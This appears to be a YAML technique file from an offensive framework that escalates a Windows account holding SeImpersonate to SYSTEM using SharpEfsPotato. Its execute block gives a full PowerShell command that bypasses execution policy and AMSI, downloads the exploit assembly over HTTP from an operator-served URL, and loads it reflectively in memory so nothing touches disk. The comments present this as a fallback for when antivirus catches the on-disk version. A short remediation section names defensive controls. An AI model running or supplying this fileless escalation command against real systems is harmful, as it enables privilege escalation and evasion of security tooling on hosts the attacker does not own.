# SeImpersonate → SYSTEM via SharpEfsPotato (in-memory reflective load)
#
# Reflectively loads the same SharpEfsPotato.exe over HTTP into the current
# PowerShell process's AppDomain — nothing lands on disk. Escalate loop
# climbs here when the native rung is caught by AV.
#
# The {{url}} + {{served}} + {{amsi}} single-brace placeholders are
# resolved by fieldkit.provision at serve time — NOT substituted here.
technique: T1134.002
name: SeImpersonate → SYSTEM (SharpEfsPotato, in-memory reflective load)
tactic: [privilege-escalation, defense-evasion]
platform: [windows]
key: seimpersonate:ps-efspotato
family: seimpersonate
delivery: inmem-fileless
ranking:
  exploitability: high
  safety: config-change
  detection: moderate
detect:
  privilege: [SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege]
execute:
  shell: cmd
  command: |-
    powershell -ep bypass -c "{amsi}$a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('{url}{served}'));$a.EntryPoint.Invoke($null,@(,[string[]]@('-p','C:\Windows\System32\cmd.exe','-a','/c whoami')))"
  serves:
    - SharpEfsPotato
cleanup:
  command: ""
verify:
  success: "NT AUTHORITY"
report:
  vector_type: seimpersonate
  description: >
    Reflectively loads SharpEfsPotato.exe (served over HTTP by fieldkit) into the
    current PowerShell process. The .NET assembly's EntryPoint is invoked
    directly; no .exe touches disk. SharpEfsPotato (.NET) abuses EFSRPC (MS-EFSR) — works where the spooler is disabled.
  remediation: >
    ScriptBlock logging + AMSI must be enforced. Constrained Language Mode
    for PowerShell defeats [Reflection.Assembly]::Load; deploy WDAC/CLM.
  refs: [T1134.002, T1620, SharpEfsPotato]
